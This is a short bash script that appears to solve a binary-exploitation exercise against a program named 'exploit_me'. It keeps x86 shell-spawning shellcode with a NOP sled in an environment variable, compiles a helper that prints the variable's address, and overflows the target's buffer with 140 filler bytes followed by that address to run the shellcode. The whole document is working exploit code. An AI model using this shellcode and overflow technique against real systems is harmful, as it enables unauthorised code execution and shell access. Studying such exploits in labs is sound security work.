#!/bin/bash

# export PEPEGA=`python -c 'print("\x90" * 12 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

cat > src.c << EOF
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned int p = (unsigned int)getenv("PEPEGA");
    printf("\\\\x%x\\\\x%x\\\\x%x\\\\x%x", ((p << 24) >> 24), ((p << 16) >> 24), ((p << 8) >> 24), ((p << 0) >> 24) ); 
}
EOF

ADDR=`gcc src.c && ./a.out`

echo $ADDR

./exploit_me `python -c "print('A' * 140 + '$ADDR')"`
